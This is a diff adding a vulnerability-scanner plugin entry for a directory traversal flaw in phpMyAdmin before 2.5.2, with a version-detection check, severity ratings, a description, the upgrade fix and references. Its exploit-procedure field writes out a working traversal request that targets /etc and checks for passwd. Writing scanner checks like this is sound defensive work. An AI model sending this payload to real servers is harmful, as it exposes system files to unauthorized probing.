@@ -1,0 +1,41 @@
+<plugin_id>342</plugin_id>
+<plugin_name>phpMyAdmin prior 2.5.2 db_details_importdocsql.php directory traversal</plugin_name>
+<plugin_family>CGI</plugin_family>
+<plugin_created_date>2005/01/09</plugin_created_date>
+<plugin_created_name>Marc Ruef</plugin_created_name>
+<plugin_created_email>marc.ruef at computec.ch</plugin_created_email>
+<plugin_created_web>http://www.computec.ch</plugin_created_web>
+<plugin_created_company>computec.ch</plugin_created_company>
+<plugin_version>1.0</plugin_version>
+<plugin_protocol>tcp</plugin_protocol>
+<plugin_port>80</plugin_port>
+<plugin_procedure_detection>open|send GET /main.php HTTP/1.0\n\n|sleep|close|pattern_exists HTTP/#.# 200 *Welcome *to *phpMyAdmin*2.[0-4].*</h1>* OR HTTP/#.# 200 *Welcome *to *phpMyAdmin*2.5.[0-2]*</h1>*</plugin_procedure_detection>
+<plugin_detection_accuracy>80</plugin_detection_accuracy>
+<plugin_procedure_exploit>open|send GET /db_details_importdocsql.php?submit_show=true&do=import&docpath=../../../../../../../../../../etc HTTP/1.0\n\n|sleep|close|pattern_exists HTTP/#.# 200 *Ignoring file passwd*</plugin_procedure_exploit>
+<plugin_exploit_accuracy>97</plugin_exploit_accuracy>
+<plugin_comment>The NASL script is Copyright (C) 2003 Tenable Network Security</plugin_comment>
+<bug_published_name>Lorenzo Manuel Hernandez Garcia-Hierro</bug_published_name>
+<bug_published_email>security at lorenzohgh.com</bug_published_email>
+<bug_affected>phpMyAdmin prior 2.5.2</bug_affected>
+<bug_not_affected>phpMyAdmin newer than 2.5.2</bug_not_affected>
+<bug_vulnerability_class>Directory Traversal</bug_vulnerability_class>
+<bug_description>The remote host is running a version of phpMyAdmin which is vulnerable to several flaws: It may be tricked into disclosing the physical path of the remote PHP installation, it is vulnerable to Cross-Site scripting, which may allow an attacker to steal the cookies of your users and it is vulnerable to a flaw which may allow an attacker to list the content of arbitrary directories on the remote server. An attacker may use these flaws to gain more knowledge about the remote host and therefore set up more complex attacks against it.</bug_description>
+<bug_solution>Upgrade to phpMyAdmin 2.5.2 or newer.</bug_solution>
+<bug_fixing_time>Approx. 30 minutes</bug_fixing_time>
+<bug_exploit_availability>Yes</bug_exploit_availability>
+<bug_exploit_url>http://www.securityfocus.com/bid/7962/exploit/</bug_exploit_url>
+<bug_remote>Yes</bug_remote>
+<bug_local>Yes</bug_local>
+<bug_severity>High</bug_severity>
+<bug_popularity>7</bug_popularity>
+<bug_simplicity>8</bug_simplicity>
+<bug_impact>8</bug_impact>
+<bug_risk>8</bug_risk>
+<bug_nessus_risk>Medium</bug_nessus_risk>
+<bug_check_tool>Nessus can check this flaw with the plugin 11761 (phpMyAdmin multiple flaws).</bug_check_tool>
+<source_securityfocus_bid>7962</source_securityfocus_bid>
+<source_nessus_id>11761</source_nessus_id>
+<source_literature>Hacking Exposed: Network Security Secrets & Solutions, Stuart McClure, Joel Scambray and George Kurtz, February 25, 2003, 4th Edition, McGraw-Hill Osborne Media, ISBN 0072227427</source_literature>
+<source_misc>http://www.computec.ch</source_misc>
+
+
